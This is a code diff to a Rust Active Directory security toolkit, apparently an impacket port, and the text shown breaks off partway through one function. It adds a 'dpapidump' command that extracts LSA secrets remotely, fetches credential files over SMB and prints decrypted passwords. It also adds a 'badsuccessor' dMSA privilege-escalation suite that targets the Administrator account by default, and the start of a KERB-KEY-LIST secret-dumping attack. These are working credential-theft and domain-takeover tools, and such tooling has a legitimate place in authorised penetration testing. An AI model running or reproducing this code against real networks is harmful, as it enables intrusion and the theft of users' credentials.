@@ -12,6 +12,7 @@
 //! `rpc-interfaces`, `bench-ndr`.
 
 mod help;
+mod completions;
 
 use impacket_auth::{
     compute_ntlm_hashes_with_compat, compute_ntlmv1_response, compute_ntlmv2_response,
@@ -107,6 +108,7 @@ fn print_usage() {
     println!("  GetLAPSPassword <TARGET> [-computer <name>]          Query Active Directory LAPS / Windows LAPS passwords (LDAP TCP/389)");
     println!("  CheckLDAPStatus <TARGET> [-port <port>]              Audit LDAP RootDSE, supported capabilities & signing enforcement");
     println!("  addcomputer <TARGET> [-computer-name <N>] [options]  Provision a computer account in Active Directory (LDAP TCP/389)");
+    println!("  badsuccessor <TARGET> [-action <search|add|del|mod>] Windows Server 2025 dMSA exploitation suite (BadSuccessor)");
     println!("  dacledit <TARGET> -target-dn <DN> [options]          Inspect or modify Active Directory DACL permissions (LDAP TCP/389)");
     println!("  owneredit <TARGET> -dn <DN> [-action query|set]      Query or change Active Directory object owner SID (LDAP TCP/389)");
     println!("  dnstool <TARGET> -action <query|add|del> [options]   Active Directory Integrated DNS record management ([MS-DNSP] LDAP)");
@@ -159,7 +161,9 @@ fn print_usage() {
     println!("  regsecrets <TARGET> [-hashes LM:NT] [-security]      Dump SAM/LSA secrets in-memory via RRP (zero disk writes)");
     println!("  ntdsdump <SYSTEM_FILE> <NTDS_FILE>                   Offline Active Directory domain NT/LM hashes dumper");
     println!("  esentutl <DATABASE_FILE> [tables|table <NAME>]        Extensible Storage Engine (ESE) offline database inspector");
-    println!("  dpapi <masterkey|blob> <FILE> [-key <HEX>]           Windows DPAPI MasterKey & Blob offline decryptor");
+    println!("  dpapi <masterkey|blob|credential> <FILE> [-key <HEX>] Windows DPAPI MasterKey, Blob & Credential offline decryptor");
+    println!("  dpapidump <TARGET> [options]                          Remote DPAPI SYSTEM credentials and MasterKeys harvester");
+    println!("  keylistattack [TARGET] -rodcNo <NO> -rodcKey <HEX>   Dump domain user secrets via MS-KILE KERB-KEY-LIST attack (RODC)");
     println!("  ticketConverter <INPUT> <OUTPUT> [-b]                Convert between .kirbi (Mimikatz) and .ccache (MIT)");
     println!("  ticketer -domain-sid <SID> -domain <D> [options]     Forge Kerberos Golden and Silver Tickets (.ccache / .kirbi)");
     println!("  describeTicket <TICKET_FILE>                         Inspect Kerberos .ccache or .kirbi ticket structures");
@@ -179,6 +183,7 @@ fn print_usage() {
     println!("  smb-negotiate [legacy|auto|modern]                   Build SMBv1/SMB2/SMB3.1.1 Negotiate PDUs");
     println!("  rpc-interfaces                                       Inspect MSRPC interface catalog & SAMR Bind PDU");
     println!("  bench-ndr [ITERATIONS]                               Benchmark compile-time NDR marshaling throughput");
+    println!("  completions <bash|zsh|fish|powershell>               Generate shell auto-completion scripts");
     println!();
     println!("GLOBAL OPTIONS (applicable across all network tools):");
     println!("  -proxy <URL>, --proxy <URL>   Route traffic through SOCKS5 (socks5://host:port) or HTTP (http://host:port) proxy");
@@ -2711,9 +2716,305 @@ fn cmd_dpapi(args: &[String]) {
                 }
             }
         }
+        "credential" | "cred" => {
+            match impacket_sam::CredentialFile::parse(&file_bytes) {
+                Ok(cred_file) => {
+                    println!("[+] Credential File Details:");
+                    println!("  Version          : {}", cred_file.version);
+                    println!("  MasterKey GUID   : {}", cred_file.blob.master_key_guid_str());
+                    println!("  Crypt Algo       : 0x{:08x}", cred_file.blob.crypt_algo);
+                    println!("  Hash Algo        : 0x{:08x}", cred_file.blob.hash_algo);
+                    println!("  Description      : {}", cred_file.blob.description);
+
+                    if let Some(ref khex) = hex_key {
+                        let clean_hex = khex.trim_start_matches("0x").trim();
+                        if let Ok(kbytes) = decode_hex(clean_hex) {
+                            match cred_file.blob.decrypt(&kbytes, None) {
+                                Ok(cleartext) => {
+                                    match impacket_sam::CredentialBlob::parse(&cleartext) {
+                                        Ok(cred) => {
+                                            println!("[+] Decrypted Credential:");
+                                            println!("  Target      : {}", cred.target);
+                                            println!("  Username    : {}", cred.username);
+                                            println!("  Password    : {}", cred.password_str());
+                                        }
+                                        Err(_) => {
+                                            if let Ok(s) = std::str::from_utf8(&cleartext) {
+                                                println!("[+] Decrypted Plaintext: {}", s);
+                                            } else {
+                                                println!("[+] Decrypted Plaintext (hex): {}", encode_hex(&cleartext));
+                                            }
+                                        }
+                                    }
+                                }
+                                Err(e) => {
+                                    eprintln!("[-] Decryption failed: {}", e);
+                                }
+                            }
+                        } else {
+                            eprintln!("[-] Invalid hex key string");
+                        }
+                    }
+                }
+                Err(e) => {
+                    eprintln!("[-] Failed to parse Credential File: {}", e);
+                }
+            }
+        }
         _ => {
-            eprintln!("[-] unknown mode '{}', expected 'masterkey' or 'blob'", mode);
+            eprintln!("[-] unknown mode '{}', expected 'masterkey', 'blob', or 'credential'", mode);
             std::process::exit(1);
+        }
+    }
+}
+
+fn cmd_dpapidump(args: &[String]) {
+    use impacket_core::decode_hex;
+    use impacket_sam::{CredentialBlob, CredentialFile, DpapiSystem, MasterKey, MasterKeyFile};
+    use impacket_smb::{SmbConnection, SmbCredential};
+    use std::collections::HashMap;
+
+    print!("{}", version::BANNER);
+    if args.is_empty() {
+        println!("usage: impacket-rs dpapidump <TARGET> [options]");
+        println!();
+        println!("Automates extraction of Windows DPAPI credentials and MasterKeys for the SYSTEM user on a remote host.");
+        println!();
+        println!("positional arguments:");
+        println!("  target                [[domain/]username[:password]@]<targetName or address>");
+        println!();
+        println!("options:");
+        println!("  -hashes LM:NT         NTLM hashes for authentication");
+        println!("  -key <HEX>            Pre-extracted DPAPI_SYSTEM user/machine key (skips remote LSA extraction)");
+        println!("  -share <SHARE>        SMB share to access filesystem (default: C$)");
+        println!("  -cred-path <PATH>     Custom directory path to scan for Credential files");
+        std::process::exit(1);
+    }
+
+    let spec = match parse_target_with_hashes(args) {
+        Ok(s) => s,
+        Err(e) => {
+            eprintln!("[-] Invalid target '{}': {}", args[0], e);
+            std::process::exit(1);
+        }
+    };
+
+    let mut explicit_key = None;
+    let mut share = "C$".to_string();
+    let mut custom_cred_path = None;
+
+    let mut i = 1;
+    while i < args.len() {
+        match args[i].as_str() {
+            "-key" if i + 1 < args.len() => {
+                explicit_key = Some(args[i + 1].clone());
+                i += 2;
+            }
+            "-share" if i + 1 < args.len() => {
+                share = args[i + 1].clone();
+                i += 2;
+            }
+            "-cred-path" if i + 1 < args.len() => {
+                custom_cred_path = Some(args[i + 1].clone());
+                i += 2;
+            }
+            _ => i += 1,
+        }
+    }
+
+    let host = spec.effective_target_ip();
+    println!("[*] Target system: {}", host);
+
+    let cred = if let Some(ref hashes) = spec.hashes {
+        SmbCredential::NtlmHashes(hashes.clone())
+    } else {
+        SmbCredential::Password(
+            spec.password
+                .as_ref()
+                .map(|p| p.expose_secret().to_string())
+                .unwrap_or_default(),
+        )
+    };
+
+    // 1. Obtain DPAPI_SYSTEM user/machine key
+    let mut dpapi_keys: Vec<Vec<u8>> = Vec::new();
+    if let Some(ref k_str) = explicit_key {
+        let clean = k_str.trim_start_matches("0x").trim();
+        match decode_hex(clean) {
+            Ok(k) => dpapi_keys.push(k),
+            Err(e) => {
+                eprintln!("[-] Invalid hex in -key: {}", e);
+                std::process::exit(1);
+            }
+        }
+    } else {
+        println!("[*] Extracting LSA secrets via MS-RRP on {} to retrieve DPAPI_SYSTEM key...", host);
+        let rrp_iface = &WELL_KNOWN_INTERFACES[IFACE_RRP];
+        let lsa_res = (|| -> Result<(), CoreError> {
+            let transport = SmbPipeTransport::connect(
+                host,
+                &spec.domain,
+                &spec.username,
+                &cred,
+                "winreg",
+                rrp_iface.uuid,
+                rrp_iface.version_major,
+                rrp_iface.version_minor,
+                spec.compat_profile,
+                DEFAULT_TIMEOUT,
+            )?;
+            let mut rrp = RrpClient::new(transport);
+            let report = impacket_sam::regsecrets_dump(&mut rrp)?;
+            for item in report.lsa_secrets {
+                if item.name.eq_ignore_ascii_case("DPAPI_SYSTEM") {
+                    if let Ok(sys) = DpapiSystem::parse(&item.secret_raw) {
+                        println!("[+] Retrieved DPAPI_SYSTEM secret from LSA:");
+                        println!("    UserKey    : 0x{}", impacket_core::encode_hex(&sys.user_key));
+                        println!("    MachineKey : 0x{}", impacket_core::encode_hex(&sys.machine_key));
+                        dpapi_keys.push(sys.user_key.to_vec());
+                        dpapi_keys.push(sys.machine_key.to_vec());
+                    }
+                }
+            }
+            Ok(())
+        })();
+
+        if let Err(e) = lsa_res {
+            eprintln!("[-] Remote LSA secret extraction failed: {}. Provide pre-extracted key with -key <HEX>", e);
+            std::process::exit(1);
+        }
+    }
+
+    if dpapi_keys.is_empty() {
+        eprintln!("[-] No DPAPI_SYSTEM keys available. Quitting.");
+        std::process::exit(1);
+    }
+
+    // 2. Connect to SMB and scan for credential files
+    println!("[*] Connecting to SMB share '{}' on {}...", share, host);
+    let mut conn = match SmbConnection::connect(host, 445, spec.compat_profile, DEFAULT_TIMEOUT) {
+        Ok(c) => c,
+        Err(e) => {
+            eprintln!("[-] SMB connection failed: {}", e);
+            std::process::exit(1);
+        }
+    };
+
+    if let Err(e) = conn.login(&spec.domain, &spec.username, &cred, "impacket-rs") {
+        eprintln!("[-] SMB login failed: {}", e);
+        std::process::exit(1);
+    }
+
+    if let Err(e) = conn.tree_connect_share(host, &share) {
+        eprintln!("[-] Failed to connect to share '{}': {}", share, e);
+        std::process::exit(1);
+    }
+
+    let mut scan_paths = vec![
+        r"Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials".to_string(),
+        r"Windows\System32\config\systemprofile\AppData\Roaming\Microsoft\Credentials".to_string(),
+    ];
+    if let Some(cp) = custom_cred_path {
+        scan_paths.push(cp);
+    }
+
+    let mut found_credentials: Vec<(String, Vec<u8>)> = Vec::new();
+    for p in &scan_paths {
+        println!("[*] Scanning directory: {}", p);
+        if let Ok(entries) = conn.list_directory(p) {
+            for entry in entries {
+                if !entry.is_directory {
+                    if entry.name.contains("DFBE70A7E5CC19A398EBF1B96859CE5D") {
+                        continue;
+                    }
+                    let file_path = format!(r"{}\{}", p, entry.name);
+                    if let Ok(content) = conn.read_full_file(&file_path) {
+                        println!("[+] Found credential file: {} ({} bytes)", file_path, content.len());
+                        found_credentials.push((file_path, content));
+                    }
+                }
+            }
+        }
+    }
+
+    if found_credentials.is_empty() {
+        println!("[*] No credential files found in standard systemprofile paths.");
+        return;
+    }
+
+    // 3. For each credential, resolve its MasterKey GUID and decrypt
+    let mk_base_dir = r"Windows\System32\Microsoft\Protect\S-1-5-18\User";
+    let mut decrypted_masterkeys: HashMap<String, [u8; 64]> = HashMap::new();
+
+    for (cred_path, cred_bytes) in &found_credentials {
+        let cred_file = match CredentialFile::parse(cred_bytes) {
+            Ok(cf) => cf,
+            Err(e) => {
+                eprintln!("[-] Skipping corrupted credential file {}: {}", cred_path, e);
+                continue;
+            }
+        };
+
+        let guid_str = cred_file.blob.master_key_guid_str();
+        println!("[*] Credential '{}' references MasterKey GUID: {}", cred_path, guid_str);
+
+        if !decrypted_masterkeys.contains_key(&guid_str) {
+            let mk_remote_path = format!(r"{}\{}", mk_base_dir, guid_str);
+            match conn.read_full_file(&mk_remote_path) {
+                Ok(mk_raw) => {
+                    let mk_obj = if let Ok(mkf) = MasterKeyFile::parse(&mk_raw) {
+                        MasterKey::parse(&mkf.master_key_bytes)
+                    } else {
+                        MasterKey::parse(&mk_raw)
+                    };
+
+                    match mk_obj {
+                        Ok(mk) => {
+                            let mut decrypted = None;
+                            for k in &dpapi_keys {
+                                if let Ok(clear) = mk.decrypt(k) {
+                                    decrypted = Some(clear);
+                                    break;
+                                }
+                            }
+                            if let Some(clear_mk) = decrypted {
+                                println!("[+] Successfully decrypted MasterKey {}: 0x{}", guid_str, impacket_core::encode_hex(&clear_mk));
+                                decrypted_masterkeys.insert(guid_str.clone(), clear_mk);
+                            } else {
+                                eprintln!("[-] Failed decrypting MasterKey {} with available DPAPI_SYSTEM keys", guid_str);
+                            }
+                        }
+                        Err(e) => eprintln!("[-] Failed parsing MasterKey {}: {}", mk_remote_path, e),
+                    }
+                }
+                Err(e) => eprintln!("[-] Could not retrieve MasterKey file {}: {}", mk_remote_path, e),
+            }
+        }
+
+        if let Some(master_key) = decrypted_masterkeys.get(&guid_str) {
+            match cred_file.blob.decrypt(master_key, None) {
+                Ok(clear_blob) => {
+                    match CredentialBlob::parse(&clear_blob) {
+                        Ok(cb) => {
+                            println!();
+                            println!("============================================================");
+                            println!("[+] DECRYPTED CREDENTIAL: {}", cred_path);
+                            println!("    Target      : {}", cb.target);
+                            println!("    Username    : {}", cb.username);
+                            println!("    Password    : {}", cb.password_str());
+                            println!("============================================================");
+                        }
+                        Err(_) => {
+                            if let Ok(s) = std::str::from_utf8(&clear_blob) {
+                                println!("[+] Decrypted Payload: {}", s);
+                            } else {
+                                println!("[+] Decrypted Payload (hex): 0x{}", impacket_core::encode_hex(&clear_blob));
+                            }
+                        }
+                    }
+                }
+                Err(e) => eprintln!("[-] Failed decrypting credential {} with MasterKey: {}", cred_path, e),
+            }
         }
     }
 }
@@ -6142,6 +6443,18 @@ pub fn parse_get_user_spns_options(args: &[String]) -> Result<GetUserSpnsOptions
                     "rc4" | "23" => requested_etypes = vec![KerberosEType::Rc4Hmac],
                     "aes128" | "17" => requested_etypes = vec![KerberosEType::Aes128CtsHmacSha1_96],
                     "aes256" | "18" => requested_etypes = vec![KerberosEType::Aes256CtsHmacSha1_96],
+                    "aes128-sha2" | "aes128-sha256" | "19" => {
+                        requested_etypes = vec![KerberosEType::Aes128CtsHmacSha256_128];
+                    }
+                    "aes256-sha2" | "aes256-sha384" | "20" => {
+                        requested_etypes = vec![KerberosEType::Aes256CtsHmacSha384_192];
+                    }
+                    "aes-sha2" => {
+                        requested_etypes = vec![
+                            KerberosEType::Aes256CtsHmacSha384_192,
+                            KerberosEType::Aes128CtsHmacSha256_128,
+                        ];
+                    }
                     "aes" => {
                         requested_etypes = vec![
                             KerberosEType::Aes256CtsHmacSha1_96,
@@ -6153,11 +6466,13 @@ pub fn parse_get_user_spns_options(args: &[String]) -> Result<GetUserSpnsOptions
                             KerberosEType::Rc4Hmac,
                             KerberosEType::Aes256CtsHmacSha1_96,
                             KerberosEType::Aes128CtsHmacSha1_96,
+                            KerberosEType::Aes256CtsHmacSha384_192,
+                            KerberosEType::Aes128CtsHmacSha256_128,
                         ];
                     }
                     other => {
                         return Err(format!(
-                            "Unknown Kerberos etype '{}' (expected: rc4, aes128, aes256, aes, all)",
+                            "Unknown Kerberos etype '{}' (expected: rc4, aes128, aes256, aes128-sha2, aes256-sha2, aes-sha2, aes, all)",
                             other
                         ));
                     }
@@ -6970,6 +7285,25 @@ fn cmd_bench_ndr(args: &[String]) {
         "  Throughput   : {:.2} million roundtrips/sec (checksum={})",
         ops_per_sec / 1_000_000.0, total_bytes
     );
+}
+
+fn cmd_completions(args: &[String]) {
+    if args.is_empty() {
+        eprintln!("[-] Missing shell argument.");
+        eprintln!("[*] Usage: impacket-rs completions <bash|zsh|fish|powershell>");
+        std::process::exit(1);
+    }
+    match args[0].to_ascii_lowercase().as_str() {
+        "bash" => print!("{}", completions::generate_bash()),
+        "zsh" => print!("{}", completions::generate_zsh()),
+        "fish" => print!("{}", completions::generate_fish()),
+        "powershell" | "pwsh" => print!("{}", completions::generate_powershell()),
+        other => {
+            eprintln!("[-] Unsupported shell: {}", other);
+            eprintln!("[*] Supported shells: bash, zsh, fish, powershell");
+            std::process::exit(1);
+        }
+    }
 }
 
 fn domain_to_base_dn(domain: &str) -> String {
@@ -9325,6 +9659,582 @@ fn cmd_addcomputer(args: &[String]) {
     }
 
     client.unbind().ok();
+}
+
+fn cmd_badsuccessor(args: &[String]) {
+    use impacket_ldap::dmsa::{
+        add_dmsa, delete_dmsa, modify_dmsa_predecessor, scan_vulnerable_ous,
+    };
+    use impacket_ldap::LdapClient;
+    use impacket_ndr::RpcSid;
+
+    print!("{}", version::BANNER);
+    if args.is_empty() {
+        eprintln!("Usage: impacket-rs badsuccessor <TARGET> [-action <search|add|delete|modify>] [options]");
+        eprintln!("  Windows Server 2025 Delegated Managed Service Account (dMSA) exploitation suite (BadSuccessor)");
+        eprintln!();
+        eprintln!("Actions:");
+        eprintln!("  search  (default) Scan OUs for loose object creation rights vulnerable to BadSuccessor");
+        eprintln!("  add     Provision a new dMSA targeting a high-privileged predecessor account");
+        eprintln!("  delete  Remove a created dMSA account from target OU");
+        eprintln!("  modify  Modify predecessor link on an existing dMSA account");
+        std::process::exit(1);
+    }
+
+    let spec = match parse_target_with_hashes(args) {
+        Ok(t) => t,
+        Err(e) => {
+            eprintln!("[-] Invalid target '{}': {}", args[0], e);
+            std::process::exit(1);
+        }
+    };
+
+    let mut action = "search".to_string();
+    let mut target_ou: Option<String> = None;
+    let mut dmsa_name: Option<String> = None;
+    let mut target_account = "Administrator".to_string();
+    let mut principals_allowed: Option<String> = None;
+    let mut dns_hostname: Option<String> = None;
+    let mut custom_base_dn: Option<String> = None;
+    let mut port: u16 = 389;
+
+    let mut i = 1;
+    while i < args.len() {
+        match args[i].as_str() {
+            "-action" if i + 1 < args.len() => {
+                action = args[i + 1].to_ascii_lowercase();
+                i += 2;
+            }
+            "-target-ou" | "-ou" if i + 1 < args.len() => {
+                target_ou = Some(args[i + 1].clone());
+                i += 2;
+            }
+            "-dmsa-name" | "-name" if i + 1 < args.len() => {
+                dmsa_name = Some(args[i + 1].clone());
+                i += 2;
+            }
+            "-target-account" | "-account" if i + 1 < args.len() => {
+                target_account = args[i + 1].clone();
+                i += 2;
+            }
+            "-principals-allowed" | "-allowed" if i + 1 < args.len() => {
+                principals_allowed = Some(args[i + 1].clone());
+                i += 2;
+            }
+            "-dns-hostname" if i + 1 < args.len() => {
+                dns_hostname = Some(args[i + 1].clone());
+                i += 2;
+            }
+            "-base" | "-base-dn" if i + 1 < args.len() => {
+                custom_base_dn = Some(args[i + 1].clone());
+                i += 2;
+            }
+            "-port" if i + 1 < args.len() => {
+                if let Ok(p) = args[i + 1].parse() {
+                    port = p;
+                }
+                i += 2;
+            }
+            _ => i += 1,
+        }
+    }
+
+    let base_dn = custom_base_dn.unwrap_or_else(|| {
+        if !spec.domain.is_empty() {
+            domain_to_base_dn(&spec.domain)
+        } else {
+            String::new()
+        }
+    });
+
+    let host = spec.effective_target_ip();
+    let addr = format!("{}:{}", host, port);
+    println!("[*] Connecting to LDAP on {}...", addr);
+    let mut client = match LdapClient::connect(&addr, DEFAULT_TIMEOUT) {
+        Ok(c) => c,
+        Err(e) => {
+            eprintln!("[-] LDAP connection failed: {}", e);
+            std::process::exit(1);
+        }
+    };
+
+    let bind_dn = if spec.username.is_empty() {
+        String::new()
+    } else if spec.username.contains('@') || spec.username.to_uppercase().contains("DC=") {
+        spec.username.clone()
+    } else if !spec.domain.is_empty() {
+        format!("{}@{}", spec.username, spec.domain)
+    } else {
+        spec.username.clone()
+    };
+
+    let password = spec.password.as_ref().map(|p| p.expose_secret()).unwrap_or("");
+    if !bind_dn.is_empty() {
+        println!("[*] Authenticating as '{}'...", bind_dn);
+        if let Err(e) = client.bind_simple(&bind_dn, password) {
+            eprintln!("[-] LDAP bind failed: {}", e);
+            std::process::exit(1);
+        }
+        println!("[+] Bind successful.");
+    }
+
+    match action.as_str() {
+        "search" => {
+            println!("[*] Searching for OUs vulnerable to BadSuccessor attack under '{}'...", base_dn);
+            let domain_entries = client.search(
+                &base_dn,
+                impacket_ldap::SearchScope::BaseObject,
+                &impacket_ldap::filter_present("objectClass"),
+                &["objectSid"],
+            ).unwrap_or_default();
+
+            let domain_sid_prefix = domain_entries.first()
+                .and_then(|e| e.get_first_raw("objectSid"))
+                .and_then(|b| RpcSid::from_le_bytes(b).ok())
+                .map(|s| s.to_string());
+
+            match scan_vulnerable_ous(&mut client, &base_dn, domain_sid_prefix.as_deref()) {
+                Ok(vulns) => {
+                    println!("[+] Found {} potential BadSuccessor vector(s):", vulns.len());
+                    for v in &vulns {
+                        let name_str = v.principal_name.as_deref().unwrap_or(&v.principal_sid);
+                        println!("  [!] OU: {}", v.ou_dn);
+                        println!("      Identity: {} ({})", name_str, v.principal_sid);
+                        println!("      Rights  : {}", v.granted_rights.join(", "));
+                        println!();
+                    }
+                }
+                Err(e) => eprintln!("[-] Scan failed: {}", e),
+            }
+        }
+        "add" => {
+            let target_ou = match target_ou {
+                Some(ou) => ou,
+                None => {
+                    eprintln!("[-] Target OU is required for dMSA creation. Specify -target-ou <OU_DN>");
+                    std::process::exit(1);
+                }
+            };
+            let dmsa_name = dmsa_name.unwrap_or_else(|| {
+                let rand_id = impacket_core::encode_hex(&impacket_crypto::sha256(b"dmsa_rand_name")[..4]);
+                format!("dMSA-{}", rand_id.to_uppercase())
+            });
+
+            let target_filter = impacket_ldap::filter_equality("sAMAccountName", &target_account);
+            let target_entries = client.search(
+                &base_dn,
+                impacket_ldap::SearchScope::WholeSubtree,
+                &target_filter,
+                &["distinguishedName"],
+            ).unwrap_or_default();
+
+            let target_dn = match target_entries.first() {
+                Some(e) => e.dn.clone(),
+                None => {
+                    eprintln!("[-] Target predecessor account '{}' not found in domain.", target_account);
+                    std::process::exit(1);
+                }
+            };
+
+            let allowed_user = principals_allowed.unwrap_or_else(|| spec.username.clone());
+            let user_filter = impacket_ldap::filter_equality("sAMAccountName", &allowed_user);
+            let user_entries = client.search(
+                &base_dn,
+                impacket_ldap::SearchScope::WholeSubtree,
+                &user_filter,
+                &["objectSid"],
+            ).unwrap_or_default();
+
+            let principal_sid = match user_entries.first().and_then(|e| e.get_first_raw("objectSid")).and_then(|b| RpcSid::from_le_bytes(b).ok()) {
+                Some(s) => s,
+                None => {
+                    eprintln!("[-] Could not resolve objectSid for allowed principal '{}'.", allowed_user);
+                    std::process::exit(1);
+                }
+            };
+
+            println!("[*] Creating dMSA '{}' under '{}'...", dmsa_name, target_ou);
+            println!("[*] Linking predecessor account: {}", target_dn);
+            println!("[*] Granting managed password retrieval to: {} ({})", allowed_user, principal_sid);
+
+            let dns_fqdn = dns_hostname.as_deref().unwrap_or(&spec.domain);
+            match add_dmsa(&mut client, &target_ou, &dmsa_name, &target_dn, &principal_sid, dns_fqdn) {
+                Ok(dn) => {
+                    println!("[+] Successfully created dMSA account!");
+                    println!("  Distinguished Name : {}", dn);
+                    println!("  sAMAccountName     : {}$", dmsa_name.trim_end_matches('$'));
+                    println!("  Predecessor Link   : {}", target_dn);
+                    println!("  Migration State    : 2 (Active/Migration)");
+                }
+                Err(e) => eprintln!("[-] Failed to create dMSA: {}", e),
+            }
+        }
+        "delete" => {
+            let target_ou = match target_ou {
+                Some(ou) => ou,
+                None => {
+                    eprintln!("[-] Target OU is required for dMSA deletion. Specify -target-ou <OU_DN>");
+                    std::process::exit(1);
+                }
+            };
+            let dmsa_name = match dmsa_name {
+                Some(n) => n,
+                None => {
+                    eprintln!("[-] dMSA name is required for deletion. Specify -dmsa-name <NAME>");
+                    std::process::exit(1);
+                }
+            };
+            println!("[*] Deleting dMSA '{}' from '{}'...", dmsa_name, target_ou);
+            match delete_dmsa(&mut client, &target_ou, &dmsa_name) {
+                Ok(_) => println!("[+] Successfully deleted dMSA '{}'.", dmsa_name),
+                Err(e) => eprintln!("[-] Failed to delete dMSA: {}", e),
+            }
+        }
+        "modify" => {
+            let target_ou = match target_ou {
+                Some(ou) => ou,
+                None => {
+                    eprintln!("[-] Target OU is required for dMSA modification. Specify -target-ou <OU_DN>");
+                    std::process::exit(1);
+                }
+            };
+            let dmsa_name = match dmsa_name {
+                Some(n) => n,
+                None => {
+                    eprintln!("[-] dMSA name is required for modification. Specify -dmsa-name <NAME>");
+                    std::process::exit(1);
+                }
+            };
+            let dmsa_dn = format!("CN={},{}", dmsa_name.trim_end_matches('$'), target_ou);
+
+            let target_filter = impacket_ldap::filter_equality("sAMAccountName", &target_account);
+            let target_entries = client.search(
+                &base_dn,
+                impacket_ldap::SearchScope::WholeSubtree,
+                &target_filter,
+                &["distinguishedName"],
+            ).unwrap_or_default();
+
+            let target_dn = match target_entries.first() {
+                Some(e) => e.dn.clone(),
+                None => {
+                    eprintln!("[-] New predecessor account '{}' not found in domain.", target_account);
+                    std::process::exit(1);
+                }
+            };
+
+            println!("[*] Modifying dMSA predecessor link on '{}' to '{}'...", dmsa_dn, target_dn);
+            match modify_dmsa_predecessor(&mut client, &dmsa_dn, &target_dn) {
+                Ok(_) => println!("[+] Successfully updated predecessor link to '{}'.", target_dn),
+                Err(e) => eprintln!("[-] Failed to modify dMSA: {}", e),
+            }
+        }
+        other => {
+            eprintln!("[-] Unknown action '{}'. Supported: search, add, delete, modify", other);
+            std::process::exit(1);
+        }
+    }
+
+    client.unbind().ok();
+}
+
+fn cmd_keylistattack(args: &[String]) {
+    use impacket_core::decode_hex;
+    use impacket_krb5::keylist::{dump_user_keylist_live, find_nthash};
+    use impacket_msrpc::samr::SamrClient;
+    use std::time::Duration;
+
+    print!("{}", version::BANNER);
+    if args.is_empty() {
+        println!("usage: impacket-rs keylistattack [target] -rodcNo <NO> -rodcKey <KEY> [options]");
+        println!();
+        println!("Performs the KERB-KEY-LIST-REQ attack (MS-KILE) to dump domain user secrets");
+        println!("using a compromised Read-Only Domain Controller (RODC) account key.");
+        println!();
+        println!("positional arguments:");
+        println!("  target                [[domain/]username[:password]@]<targetName or address>");
+        println!();
+        println!("options:");
+        println!("  -rodcNo <NO>          RODC account number (e.g. 20000, required)");
+        println!("  -rodcKey <KEY>        RODC krbtgt AES256/AES128 key in hex (required)");
+        println!("  -rodc-etype <ETYPE>   RODC key encryption type (18=AES256, 17=AES128, 23=RC4)");
+        println!("  -t, -target <USER>    Specific target username or username:rid (e.g. victim:1103)");
+        println!("  -tf <FILE>            File with target usernames to attack (one per line)");
+        println!("  -domain <DOMAIN>      Active Directory domain name");
+        println!("  -domain-sid <SID>     Domain SID (e.g. S-1-5-21-...)");
+        println!("  -kdc <HOST>           KDC hostname or IP (default: target host)");
+        println!("  -dc-ip <IP>           IP address of domain controller");
+        println!("  -full                 Output all dumped encryption keys in addition to NT hash");
+        std::process::exit(1);
+    }
+
+    let mut rodc_no: Option<u32> = None;
+    let mut rodc_key_hex: Option<String> = None;
+    let mut rodc_etype: Option<i32> = None;
+    let mut target_user: Option<String> = None;
+    let mut target_file: Option<String> = None;
+    let mut explicit_domain: Option<String> = None;
+    let mut explicit_domain_sid: Option<String> = None;
+    let mut explicit_kdc: Option<String> = None;
+    let mut full_output = false;
+    let mut non_flag_args = Vec::new();
+
+    let mut i = 0;
+    while i < args.len() {
+        match args[i].as_str() {
+            "-rodcNo" | "-rodc-no" | "-rodcno" if i + 1 < args.len() => {
+                rodc_no = args[i + 1].parse().ok();
+                i += 2;
+            }
+            "-rodcKey" | "-rodc-key" | "-rodckey" if i + 1 < args.len() => {
+                rodc_key_hex = Some(args[i + 1].clone());
+                i += 2;
+            }
+            "-rodc-etype" | "-etype" if i + 1 < args.len() => {
+                rodc_etype = args[i + 1].parse().ok();
+                i += 2;
+            }
+            "-t" | "-target" | "-target-user" if i + 1 < args.len() => {
+                target_user = Some(args[i + 1].clone());
+                i += 2;
+            }
+            "-tf" | "-target-file" if i + 1 < args.len() => {
+                target_file = Some(args[i + 1].clone());
+                i += 2;
+            }
+            "-domain" | "-d" if i + 1 < args.len() => {
+                explicit_domain = Some(args[i + 1].clone());
+                i += 2;
+            }
+            "-domain-sid" | "-sid" if i + 1 < args.len() => {
+                explicit_domain_sid = Some(args[i + 1].clone());
+                i += 2;
+            }
+            "-kdc" | "-dc-ip" if i + 1 < args.len() => {
+                explicit_kdc = Some(args[i + 1].clone());
+                i += 2;
+            }
+            "-full" => {
+                full_output = true;
+                i += 1;
+            }
+            _ => {
+                if !args[i].starts_with('-') {
+                    non_flag_args.push(args[i].clone());
+                }
+                i += 1;
+            }
+        }
+    }
+
+    let rodc_no = match rodc_no {
+        Some(no) => no,
+        None => {
+            eprintln!("[-] Missing required argument -rodcNo <NO>");
+            std::process::exit(1);
+        }
+    };
+
+    let rodc_key_raw = match rodc_key_hex {
+        Some(k) => k,
+        None => {
+            eprintln!("[-] Missing required argument -rodcKey <KEY_HEX>");
+            std::process::exit(1);
+        }
+    };
+
+    let rodc_key = match decode_hex(rodc_key_raw.trim_start_matches("0x")) {
+        Ok(k) => k,
+        Err(e) => {
+            eprintln!("[-] Invalid hex in -rodcKey: {}", e);
+            std::process::exit(1);
+        }
+    };
+
+    let etype = rodc_etype.unwrap_or_else(|| {
+        if rodc_key.len() == 32 {
+            18
+        } else if rodc_key.len() == 16 {
+            17
+        } else {
+            18
+        }
+    });
+
+    // Resolve target spec if provided
+    let spec_opt = if !non_flag_args.is_empty() {
+        parse_target_with_hashes(&non_flag_args).ok()
+    } else {
+        None
+    };
+
+    let domain = explicit_domain
+        .or_else(|| {
+            spec_opt
+                .as_ref()
+                .map(|s| s.domain.clone())
+                .filter(|d| !d.is_empty())
+        })
+        .unwrap_or_default();
+
+    if domain.is_empty() {
+        eprintln!("[-] Domain is required. Specify target domain (e.g. contoso.com/user@dc) or -domain <DOMAIN>");
+        std::process::exit(1);
+    }
+
+    let kdc_host = explicit_kdc
+        .or_else(|| spec_opt.as_ref().map(|s| s.effective_target_ip().to_string()))
+        .unwrap_or_else(|| domain.clone());
+
+    let mut targets: Vec<(String, Option<u32>)> = Vec::new();
+    let mut domain_sid = explicit_domain_sid;
+
+    if let Some(user_arg) = target_user {
+        if let Some((user, rid_str)) = user_arg.split_once(':') {
+            targets.push((user.to_string(), rid_str.parse().ok()));
+        } else {
+            targets.push((user_arg, None));
+        }
+    } else if let Some(file_path) = target_file {
+        match std::fs::read_to_string(&file_path) {
+            Ok(content) => {
+                for line in content.lines() {
+                    let line = line.trim();
+                    if line.is_empty() || line.starts_with('#') {
+                        continue;
+                    }
